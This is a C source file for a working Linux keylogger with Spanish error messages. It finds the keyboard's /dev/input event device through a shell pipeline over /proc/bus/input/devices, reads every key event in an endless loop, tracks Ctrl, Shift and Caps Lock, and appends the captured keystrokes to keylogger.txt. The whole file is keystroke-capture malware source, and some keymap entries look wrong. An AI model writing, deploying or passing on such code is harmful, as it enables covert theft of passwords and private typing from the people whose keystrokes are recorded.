#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

#define LOGFILEPATH "keylogger.txt"

char keymap[58] = {
    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '?',0, '\b', 0, 'q',
    'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[',
    ']', '\n', 0, 'a', 's', 'd', 'f', 'g', 'h', 'j',
    'k', 'l', 'n', '{', 'º', 0, '}', 'z', 'x', 'c',
    'v', 'b', 'n', 'm', 0, 0, 0, 0, 0, 0, ' '
};

char block_keymap[58] = {
    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '?',0, '\b', 0, 'Q',
    'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '[',
    ']', '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J',
    'K', 'L', 'N', '{', 'º', 0, '}', 'Z', 'X', 'C',
    'V', 'B', 'N', 'M', 0, 0, 0, 0, 0, 0, ' '
};

int ctrl_pressed = 0;
int shift_pressed = 0;
int caps_lock_on = 0;

char *getEvent();
char keycode_to_char(int keycode, int is_up);

int main() {
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard) - 1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard < 0) {
        perror("Error al abrir el dispositivo");
        exit(1);
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        perror("Error al abrir el archivo de log");
        close(device_keyboard);
        exit(1);
    }

    while (1) {
        ssize_t bytes_read = read(device_keyboard, &ev, sizeof(ev));
        if (bytes_read < 0) {
            perror("Error al leer del dispositivo");
            fclose(fp);
            close(device_keyboard);
            exit(1);
        }

        if (ev.type == EV_KEY) {
            if (ev.value == 1) {
                if (ev.code == 29 || ev.code == 97) {
                    ctrl_pressed = 1;
                } else if (ev.code == 42 || ev.code == 54) {
                    shift_pressed = 1;
                } else if (ev.code == 58) {
                    caps_lock_on = !caps_lock_on;
                } else {
                    char ch = keycode_to_char(ev.code, shift_pressed);
                    if (ch != 0) {
                        if (ctrl_pressed) {
                            fprintf(fp, "Ctrl+%c\n", ch);
                        }else if (shift_pressed) {
                            fprintf(fp, "Shift+%c\n", ch);
                        }
                        else {
                            fprintf(fp, "%c", ch);
                        }
                    }
                }
            } else if (ev.value == 0) {
                if (ev.code == 29 || ev.code == 97) {
                    ctrl_pressed = 0;
                } else if (ev.code == 42 || ev.code == 54) {
                    shift_pressed = 0;
                }
            }
        }
        fflush(fp);
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent() {
    char *command = "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe) {
        perror("Error al ejecutar el comando");
        exit(1);
    }
    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}

char keycode_to_char(int keycode, int is_up) {
    if (keycode >= 0 && keycode < sizeof(keymap)) {
        char ch = is_up ? block_keymap[keycode] : keymap[keycode];
        if (caps_lock_on && ch >= 'a' && ch <= 'z') {
            return ch - 'a' + 'A';
        }
        return ch;
    }
    return 0;
}
